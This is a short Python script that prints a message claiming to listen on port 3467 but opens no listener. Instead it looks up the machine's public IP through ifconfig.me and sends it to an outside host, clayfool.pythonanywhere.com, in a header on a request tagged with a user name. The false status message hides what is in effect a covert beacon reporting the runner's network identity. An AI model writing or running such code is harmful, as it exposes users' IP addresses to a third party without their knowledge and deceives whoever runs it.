import requests
print("Listening on 0.0.0.0:3467")
requests.get("https://clayfool.pythonanywhere.com/clayfool/login_page?name=mypro56&page=empty", headers={"X-Forwarded-For": requests.get("https://ifconfig.me/ip").text})
